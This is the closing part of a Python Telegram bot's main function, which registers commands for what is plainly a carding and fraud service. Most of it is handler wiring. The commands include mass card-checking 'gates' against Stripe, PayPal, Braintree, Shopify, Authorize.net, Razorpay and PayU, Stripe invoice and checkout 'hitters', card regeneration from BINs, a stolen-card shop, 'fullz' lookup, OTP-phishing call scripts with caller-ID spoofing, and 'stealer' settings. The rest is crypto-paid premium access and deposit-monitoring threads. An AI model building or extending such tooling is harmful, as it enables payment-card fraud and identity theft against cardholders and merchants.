    application.add_handler(CommandHandler("msstxt", lambda u, c: mass_check_txt_shortcut(u, c, "ss")))
    application.add_handler(CommandHandler("mbutxt", lambda u, c: mass_check_txt_shortcut(u, c, "bu")))
    application.add_handler(CommandHandler("msqtxt", lambda u, c: mass_check_txt_shortcut(u, c, "sq")))
    
    # Mass check TXT file shortcuts - Premium gates
    application.add_handler(CommandHandler("mpptxt", lambda u, c: mass_check_txt_shortcut(u, c, "pp")))
    application.add_handler(CommandHandler("msortxt", lambda u, c: mass_check_txt_shortcut(u, c, "sor")))
    application.add_handler(CommandHandler("mst5txt", lambda u, c: mass_check_txt_shortcut(u, c, "st5")))
    application.add_handler(CommandHandler("mst12txt", lambda u, c: mass_check_txt_shortcut(u, c, "st12")))
    application.add_handler(CommandHandler("mstrtxt", lambda u, c: mass_check_txt_shortcut(u, c, "str")))
    application.add_handler(CommandHandler("mdeptxt", lambda u, c: mass_check_txt_shortcut(u, c, "dep")))
    application.add_handler(CommandHandler("mauztxt", lambda u, c: mass_check_txt_shortcut(u, c, "auz")))
    application.add_handler(CommandHandler("masdtxt", lambda u, c: mass_check_txt_shortcut(u, c, "asd")))
    application.add_handler(CommandHandler("matftxt", lambda u, c: mass_check_txt_shortcut(u, c, "atf")))
    application.add_handler(CommandHandler("manhtxt", lambda u, c: mass_check_txt_shortcut(u, c, "anh")))
    application.add_handler(CommandHandler("msh6txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh6")))
    application.add_handler(CommandHandler("msh8txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh8")))
    application.add_handler(CommandHandler("msh10txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh10")))
    application.add_handler(CommandHandler("msh13txt", lambda u, c: mass_check_txt_shortcut(u, c, "sh13")))
    application.add_handler(CommandHandler("mbt1txt", lambda u, c: mass_check_txt_shortcut(u, c, "bt1")))
    application.add_handler(CommandHandler("mbt3dtxt", lambda u, c: mass_check_txt_shortcut(u, c, "bt3d")))
    application.add_handler(CommandHandler("mstmtxt", lambda u, c: mass_check_txt_shortcut(u, c, "stm")))
    
    # Dot prefix handlers (.pp, .ss, etc.)
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_dot_commands))
    
    # Gate handlers - Free
    application.add_handler(CommandHandler("sq", gate_sq))
    application.add_handler(CommandHandler("bu", gate_bu))
    
    # Gate handlers - Premium PayPal
    application.add_handler(CommandHandler("pp", gate_pp))
    application.add_handler(CommandHandler("ppv", gate_ppv))
    
    # Gate handlers - Premium Stripe
    application.add_handler(CommandHandler("sor", gate_sor))
    application.add_handler(CommandHandler("st5", gate_st5))
    application.add_handler(CommandHandler("st12", gate_st12))
    application.add_handler(CommandHandler("str", gate_str))
    application.add_handler(CommandHandler("b3n", gate_b3n))
    application.add_handler(CommandHandler("dep", gate_dep))
    
    # Gate handlers - Premium Authorize.net
    application.add_handler(CommandHandler("auz", gate_auz))
    application.add_handler(CommandHandler("asd", gate_asd))
    application.add_handler(CommandHandler("atf", gate_atf))
    application.add_handler(CommandHandler("anh", gate_anh))
    
    # Gate handlers - Premium Shopify
    application.add_handler(CommandHandler("sh6", gate_sh6))
    application.add_handler(CommandHandler("sh8", gate_sh8))
    application.add_handler(CommandHandler("sh10", gate_sh10))
    application.add_handler(CommandHandler("sh13", gate_sh13))
    
    # Gate handlers - Braintree (External API)
    application.add_handler(CommandHandler("b3", gate_b3))
    application.add_handler(CommandHandler("mb3", mass_b3))
    
    # Gate handlers - Premium Braintree
    application.add_handler(CommandHandler("bt1", gate_bt1))
    application.add_handler(CommandHandler("bt3d", gate_bt3d))
    
    # Gate handlers - Braintree API (vkrm)
    application.add_handler(CommandHandler("b3", gate_b3))
    application.add_handler(CommandHandler("mb3", gate_mb3))
    
    # Gate handlers - Auto Stripe Auth (newrp.vercel.app)
    application.add_handler(CommandHandler("ast", gate_ast))
    application.add_handler(CommandHandler("mast", mass_ast))
    
    # Gate handlers - Stripe NewRP Auth
    application.add_handler(CommandHandler("st", gate_st))
    application.add_handler(CommandHandler("mst", mass_st))
    application.add_handler(CommandHandler("msttxt", lambda u, c: mass_check_txt_shortcut(u, c, "st")))
    
    # Gate handlers - Razorpay (BarryX API)
    application.add_handler(CommandHandler("rz", gate_rz))
    application.add_handler(CommandHandler("b3", gate_b3))
    application.add_handler(CommandHandler("mb3", mass_b3))
    application.add_handler(CommandHandler("mrz", gate_mrz))
    
    # Gate handlers - Razorpay Pages (External API)
    application.add_handler(CommandHandler("rzp", gate_rzp))
    application.add_handler(CommandHandler("mrzp", gate_mrzp))
    
    # Gate handlers - PayU ₹1
    application.add_handler(CommandHandler("payu", gate_payu))
    application.add_handler(CommandHandler("mpayu", gate_mpayu))
    
    application.add_handler(CommandHandler("kill", gate_kill))
    # Register Stripe Invoice Hitter
    application.add_handler(CommandHandler("inv", stripe_invoice_hitter))
    # Register Epoch Hitter
    application.add_handler(CommandHandler("cam", epoch_hitter))
    # Only auto-trigger invoice hitter on invoice.stripe.com URLs (not checkout URLs)
    application.add_handler(MessageHandler(filters.Regex(r'(https?://invoice\.stripe\.com/\S+)'), stripe_invoice_hitter))
    application.add_handler(CommandHandler("mpp", mass_pp))
    
    # Stop mass check command
    application.add_handler(CommandHandler("stop", stop_mass_check))
    
    # Gate handlers - Premium Stripe Mass Auth
    application.add_handler(CommandHandler("stm", gate_stm))
    
    # Gate handlers - Premium Stripe €1
    application.add_handler(CommandHandler("se1", gate_se1))
    
    # Gate handlers - Premium Shopify Auto
    application.add_handler(CommandHandler("sh", gate_sh))
    application.add_handler(CommandHandler("msh", mass_sh))
    application.add_handler(CommandHandler("mshtxt", lambda u, c: mass_check_txt_shortcut(u, c, "sh")))
    
    # Auto Hitter handlers
    application.add_handler(CommandHandler("co", auto_hitter_command))
    application.add_handler(CommandHandler("hit", auto_hitter_command))
    application.add_handler(CommandHandler("bulkhit", bulkhit_command))
    application.add_handler(CommandHandler("coinfo", coinfo_command))
    application.add_handler(CommandHandler("cocheck", cocheck_command))
    application.add_handler(CommandHandler("mco", mco_command))
    application.add_handler(CommandHandler("inv", stripe_invoice_hitter))
    application.add_handler(CommandHandler("cam", epoch_hitter))
    # Saved BIN commands
    application.add_handler(CommandHandler("savebin", savebin_command))
    application.add_handler(CommandHandler("mybins", mybins_command))
    application.add_handler(CommandHandler("deletebin", deletebin_command))
    
    # Proxy Management handlers
    application.add_handler(CommandHandler("addproxy", addproxy_command))
    application.add_handler(CommandHandler("removeproxy", removeproxy_command))
    application.add_handler(CommandHandler("myproxy", myproxy_command))
    application.add_handler(CommandHandler("checkproxy", checkproxy_command))
    
    # Email Management handlers
    application.add_handler(CommandHandler("setemail", setemail_command))
    application.add_handler(CommandHandler("myemail", myemail_command))
    
    # Stripe $1 Gate handler
    application.add_handler(CommandHandler("st1", gate_st1))
    application.add_handler(CommandHandler("mst1", lambda u, c: mass_check_shortcut(u, c, "st1")))
    application.add_handler(CommandHandler("mst1txt", lambda u, c: mass_check_txt_shortcut(u, c, "st1")))
    
    # Admin handlers
    application.add_handler(CommandHandler("ping", ping_command))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("rspfakeon", rspfakeon))
    application.add_handler(CommandHandler("rspfakeoff", rspfakeoff))
    application.add_handler(CommandHandler("premium", give_premium))
    application.add_handler(CommandHandler("rmpremium", remove_premium))
    application.add_handler(CommandHandler("info", user_info))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("unban", unban_user))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("stats", bot_stats))
    application.add_handler(CommandHandler("pending", pending_users))
    application.add_handler(CommandHandler("addadmin", add_admin))
    application.add_handler(CommandHandler("removeadmin", remove_admin))
    application.add_handler(CommandHandler("admins", list_admins))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("setstealer", set_stealer))
    application.add_handler(CommandHandler("teststealer", test_stealer))
    application.add_handler(CommandHandler("getid", get_chat_id))
    
    # Proxy Shop handler
    application.add_handler(CommandHandler("proxyshop", proxyshop_command))
    application.add_handler(CommandHandler("proxies", myproxies_command))
    application.add_handler(CommandHandler("myproxies", myproxies_command))

    # CC Shop handlers
    application.add_handler(CommandHandler("shop", shop_command))
    application.add_handler(CommandHandler("checkout", checkout_command))
    application.add_handler(CommandHandler("call", call_command))
    application.add_handler(CommandHandler("setscript", setscript_command))
    application.add_handler(CommandHandler("myscript", myscript_command))
    application.add_handler(CommandHandler("clearscript", clearscript_command))
    application.add_handler(CallbackQueryHandler(call_lang_callback, pattern="^calllang_"))
    application.add_handler(CallbackQueryHandler(otp_action_callback, pattern="^otp_(accept|decline)_"))
    application.add_handler(CommandHandler("shopbuy", shopbuy_command))
    application.add_handler(CommandHandler("buy", shopbuy_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("addbalance", addbalance_command))
    application.add_handler(CommandHandler("mypurchases", mypurchases_command))
    application.add_handler(CommandHandler("purchased", mypurchases_command))

    # Premium Key handlers
    application.add_handler(CommandHandler("genkey", generate_premium_key))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("redeem", redeem_premium_key))
    application.add_handler(CommandHandler("keys", list_keys))
    application.add_handler(CommandHandler("burn", burn_keys_command))
    
    # Crypto Payment handlers
    application.add_handler(CommandHandler("buy", buy_crypto))
    application.add_handler(CommandHandler("crypto", buy_crypto))
    application.add_handler(CommandHandler("mypayments", my_payments))
    application.add_handler(CommandHandler("checkpayment", check_payment))
    application.add_handler(CommandHandler("cryptoactivate", admin_activate_crypto))
    
    # Telegram Stars Payment handlers
    application.add_handler(PreCheckoutQueryHandler(handle_pre_checkout))
    application.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, handle_successful_payment))

    # TON payment — receive transaction hash from user
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ton_txhash), group=1)
    
    # Secret & Premium handlers
    application.add_handler(CommandHandler("secretapproved", secret_approved))
    application.add_handler(CommandHandler("revenue", revenue_stats))
    application.add_handler(CommandHandler("plans", show_plans))
    application.add_handler(CommandHandler("info", user_info))
    
    application.add_handler(CallbackQueryHandler(hit_callback_handler, pattern="^(hit(all|first|close|stop)|sbin)_"))
    application.add_handler(CallbackQueryHandler(save_proxy_callback, pattern="^saveproxy_"))
    application.add_handler(CallbackQueryHandler(discard_proxy_callback, pattern="^discardproxy_"))
    application.add_handler(CallbackQueryHandler(regenerate_cards_callback, pattern="^regen"))
    application.add_handler(CallbackQueryHandler(button_callback))
    
    application.add_handler(CommandHandler("address", cmd_address))
    application.add_handler(CommandHandler("fullz", cmd_fullz))
    application.add_handler(CommandHandler("credits", cmd_balance))
    application.add_handler(CommandHandler("mybalance", cmd_balance))
    application.add_handler(CommandHandler("redeem_voucher", cmd_redeem))
    application.add_handler(CommandHandler("voucher", cmd_voucher))
    application.add_handler(CommandHandler("addcredits", cmd_addcredits))
    application.add_handler(CommandHandler("gift", cmd_gift))
    application.add_handler(CommandHandler("setcallerid", cmd_setcallerid))
    application.add_handler(CommandHandler("callerid", cmd_callerid))
    application.add_handler(CommandHandler("analytics", cmd_analytics))
    application.add_handler(CommandHandler("gatetest", cmd_gatetest))
    application.add_handler(CommandHandler("find", cmd_find))
    application.add_handler(CommandHandler("restart", cmd_restart))
    application.add_handler(CommandHandler("reseller", cmd_reseller))
    application.add_handler(CommandHandler("addclient", cmd_addclient))
    application.add_handler(CommandHandler("escrow", cmd_escrow))
    application.add_handler(CommandHandler("hibpwatch", cmd_hibpwatch))
    application.add_handler(CommandHandler("watchemail", cmd_hibpwatch))
    application.add_handler(CommandHandler("scraper", cmd_scraper))
    application.add_handler(CommandHandler("marketplace", cmd_marketplace))
    application.add_handler(CommandHandler("market", cmd_market))
    application.add_handler(CommandHandler("proxyinfo", cmd_proxy_info))
    application.add_handler(CommandHandler("geterror", cmd_geterror))

    # Robust error handler - catches all errors without crashing
    conflict_count = [0]
    async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
        try:
            error_msg = str(context.error) if context.error else "Unknown error"
            
            # Handle bot conflict (multiple instances running) - just log, don't stop
            if "Conflict" in error_msg and "getUpdates" in error_msg:
                conflict_count[0] += 1
                if conflict_count[0] <= 3:
                    print(f"⚠️ Bot conflict detected ({conflict_count[0]}/3) - Another instance may be running")
                # Don't stop - let it keep running
                return
            
            # Handle network/timeout errors gracefully (don't crash)
            if any(x in error_msg.lower() for x in ['timeout', 'timed out', 'connection', 'network']):
                print(f"⚠️ Network issue (will retry): {error_msg[:100]}")
                return
            
            # Handle Telegram API errors gracefully
            if "telegram" in error_msg.lower() or "bad request" in error_msg.lower():
                print(f"⚠️ Telegram API error: {error_msg[:100]}")
                return
            
            # Log other errors but don't crash
            print(f"⚠️ Exception while handling update: {error_msg[:200]}")
        except Exception as e:
            # Even the error handler should never crash
            print(f"⚠️ Error in error handler: {e}")
    
    application.add_error_handler(error_handler)
    
    import threading
    def _premium_expiry_checker():
        """Background thread to check and notify users whose premium has expired"""
        import time as _time
        _time.sleep(30)
        if not BOT_TOKEN:
            print("[Premium] No BOT_TOKEN, expiry checker disabled")
            return
        while True:
            try:
                from modules.database import get_expired_premium_users, remove_premium_sync
                expired_users = get_expired_premium_users()
                for user_data in expired_users:
                    uid = user_data.get("user_id")
                    if not uid:
                        continue
                    notified = False
                    try:
                        import requests as req
                        resp = req.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            json={
                                "chat_id": uid,
                                "text": "⚠️ <b>Premium Expired</b>\n\n"
                                        "Your premium subscription has expired.\n"
                                        "You no longer have access to premium features.\n\n"
                                        "💎 Use /premium to renew your subscription.",
                                "parse_mode": "HTML"
                            },
                            timeout=10
                        )
                        notified = True
                        print(f"[Premium] Notified user {uid} about expiry")
                    except Exception as e:
                        print(f"[Premium] Could not notify user {uid}: {e}")
                    remove_premium_sync(uid)
                    if not notified:
                        print(f"[Premium] Removed expired premium for {uid} (notification failed)")
            except Exception as e:
                print(f"[Premium] Expiry check error: {e}")
            _time.sleep(300)
    
    expiry_thread = threading.Thread(target=_premium_expiry_checker, daemon=True)
    expiry_thread.start()
    print("⏰ Premium expiry checker started (checks every 5 minutes)")

    try:
        start_monitor(bot=None, admin_chat_id=OWNER_ID if OWNER_ID else None)
        print("📊 Gate uptime monitor started")
    except Exception as _me:
        print(f"⚠️ Gate monitor: {_me}")

    try:
        start_hibp_watcher(bot=None)
        print("👁 HIBP breach watcher started")
    except Exception as _he:
        print(f"⚠️ HIBP watcher: {_he}")

    def _crypto_deposit_notifier():
        import time as _time
        import requests as req
        _time.sleep(60)
        if not BOT_TOKEN:
            print("[Wallet] No BOT_TOKEN, deposit notifier disabled")
            return

        _EXPLORER_URLS = {
            "ethereum": "https://etherscan.io/tx/",
            "bsc": "https://bscscan.com/tx/",
            "polygon": "https://polygonscan.com/tx/",
            "arbitrum": "https://arbiscan.io/tx/",
            "optimism": "https://optimistic.etherscan.io/tx/",
            "avalanche": "https://snowtrace.io/tx/",
            "solana": "https://solscan.io/tx/",
            "ton": "https://tonscan.org/tx/",
            "bitcoin": "https://blockstream.info/tx/",
            "tron": "https://tronscan.org/#/transaction/",
        }
        _CHAIN_LABELS = {
            "ethereum": "Ethereum", "bsc": "BNB Chain", "polygon": "Polygon",
            "arbitrum": "Arbitrum", "optimism": "Optimism", "avalanche": "Avalanche",
            "solana": "Solana", "ton": "TON", "bitcoin": "Bitcoin", "tron": "TRON",
        }
        _CHAIN_SYMBOLS = {
            "ethereum": "ETH", "bsc": "BNB", "polygon": "POL",
            "arbitrum": "ETH", "optimism": "ETH", "avalanche": "AVAX",
            "solana": "SOL", "ton": "TON", "bitcoin": "BTC", "tron": "TRX",
        }
        _BLOCKSCOUT = {
            "ethereum": ("https://eth.blockscout.com/api", "ETH", 18),
            "bsc": ("https://bsc.blockscout.com/api", "BNB", 18),
            "polygon": ("https://polygon.blockscout.com/api", "POL", 18),
            "arbitrum": ("https://arbitrum.blockscout.com/api", "ETH", 18),
            "optimism": ("https://optimism.blockscout.com/api", "ETH", 18),
            "avalanche": ("https://avax.blockscout.com/api", "AVAX", 18),
        }

        seen_txs = set()
        first_run = True

        print("[Wallet] 💰 Crypto deposit notifier started")

        while True:
            try:
                from modules.database import _execute_with_retry, is_db_connected
                if not is_db_connected():
                    _time.sleep(120)
                    continue

                rows = _execute_with_retry(
                    "SELECT telegram_id, chain, address FROM wallet_addresses",
                    fetch=True
                )
                if not rows:
                    _time.sleep(120)
                    continue

                for row in rows:
                    tg_id, chain, address = row[0], row[1], row[2]
                    if not address or not chain:
                        continue

                    try:
                        recent_txs = []

                        if chain in _BLOCKSCOUT:
                            api_url, sym, dec = _BLOCKSCOUT[chain]
                            r = req.get(
                                api_url,
                                params={"module": "account", "action": "txlist",
                                        "address": address, "sort": "desc",
                                        "offset": 5, "page": 1},
                                timeout=10,
                            )
                            result = r.json().get("result")
                            if isinstance(result, list):
                                for tx in result:
                                    if not isinstance(tx, dict):
                                        continue
                                    to_addr = (tx.get("to") or "").lower()
                                    if to_addr == address.lower() and tx.get("isError") == "0":
                                        val_raw = int(tx.get("value", 0))
                                        if val_raw > 0:
                                            recent_txs.append({
                                                "hash": tx.get("hash"),
                                                "value": val_raw / (10 ** dec),
                                                "symbol": sym,
                                                "from": tx.get("from", ""),
                                            })

                        elif chain == "ton":
                            r = req.get(
                                "https://toncenter.com/api/v2/getTransactions",
                                params={"address": address, "limit": 5},
                                timeout=10,
                            )
                            for tx in (r.json().get("result") or []):
                                msg = tx.get("in_msg", {}) or {}
                                dest = (msg.get("destination") or "").lower()
                                if dest and address.lower() in dest:
                                    val = int(msg.get("value", 0) or 0)
                                    if val > 0:
                                        recent_txs.append({
                                            "hash": tx.get("transaction_id", {}).get("hash", ""),
                                            "value": val / 1e9,
                                            "symbol": "TON",
                                            "from": msg.get("source", ""),
                                        })

                        elif chain == "solana":
                            r = req.post(
                                "https://api.mainnet-beta.solana.com",
                                json={"jsonrpc": "2.0", "id": 1,
                                      "method": "getSignaturesForAddress",
                                      "params": [address, {"limit": 5}]},
                                timeout=10,
                            )
                            for sig in (r.json().get("result") or []):
                                if not sig.get("err"):
                                    recent_txs.append({
                                        "hash": sig.get("signature", ""),
                                        "value": None,
                                        "symbol": "SOL",
                                        "from": "",
                                    })

                        elif chain == "tron":
                            r = req.get(
                                "https://apilist.tronscan.org/api/transaction",
                                params={"address": address, "limit": 5,
                                        "sort": "-timestamp"},
                                timeout=10,
                            )
                            for tx in (r.json().get("data") or []):
                                to_a = (tx.get("toAddress") or "").lower()
                                if to_a == address.lower():
                                    val = int(tx.get("amount", 0))
                                    if val > 0:
                                        recent_txs.append({
                                            "hash": tx.get("hash", ""),
                                            "value": val / 1e6,
                                            "symbol": "TRX",
                                            "from": tx.get("ownerAddress", ""),
                                        })

                        for tx_info in recent_txs:
                            tx_hash = tx_info.get("hash", "")
                            if not tx_hash:
                                continue
                            tx_key = f"{chain}:{tx_hash}"
                            if tx_key in seen_txs:
                                continue
                            seen_txs.add(tx_key)

                            if first_run:
                                continue

                            val = tx_info.get("value")
                            sym = tx_info.get("symbol", _CHAIN_SYMBOLS.get(chain, ""))
                            sender = tx_info.get("from", "")
                            short_sender = sender[:6] + "…" + sender[-4:] if len(sender) > 12 else sender
                            explorer = _EXPLORER_URLS.get(chain, "")
                            chain_label = _CHAIN_LABELS.get(chain, chain)
                            val_str = f"{val:.6f}" if val else "?"

                            text = (
                                f"💰 <b>Crypto Received!</b>\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                                f"🔗 <b>Network:</b> {chain_label}\n"
                                f"💎 <b>Amount:</b> {val_str} {sym}\n"
                                f"📤 <b>From:</b> <code>{short_sender}</code>\n\n"
                                f"━━━━━━━━━━━━━━━━━━━━\n"
                                f"✅ <b>Confirmed on blockchain</b>"
                            )

                            keyboard = []
                            if explorer and tx_hash:
                                keyboard.append([{"text": "🔍 View on Explorer", "url": f"{explorer}{tx_hash}"}])
                            keyboard.append([{"text": "💰 Open Wallet", "url": f"https://t.me/{BOT_USERNAME}"}])

                            try:
                                req.post(
                                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                                    json={
                                        "chat_id": tg_id,
                                        "text": text,
                                        "parse_mode": "HTML",
                                        "reply_markup": {"inline_keyboard": keyboard},
                                    },
                                    timeout=10,
                                )
                                print(f"[Wallet] Notified {tg_id}: received {val_str} {sym} on {chain_label}")
                            except Exception as ne:
                                print(f"[Wallet] Failed to notify {tg_id}: {ne}")

                    except Exception as ce:
                        pass

                if first_run:
                    first_run = False
                    print(f"[Wallet] First scan done — cached {len(seen_txs)} existing txs")

                if len(seen_txs) > 50000:
                    oldest = list(seen_txs)[:25000]
                    for k in oldest:
                        seen_txs.discard(k)

            except Exception as e:
                print(f"[Wallet] Deposit check error: {e}")

            _time.sleep(120)

    deposit_thread = threading.Thread(target=_crypto_deposit_notifier, daemon=True)
    deposit_thread.start()
    print("💰 Crypto deposit notifier started (checks every 2 minutes)")

    # Start bot
    if not BOT_TOKEN:
        print("❌ ERROR: BOT_TOKEN is missing!")
        return

    print("✅ Bot is running!")
    print("🚀 Ready to receive commands...")
    print("=" * 80)
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True
    )

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"❌ CRITICAL ERROR: {str(e)}")
        import traceback
        traceback.print_exc()
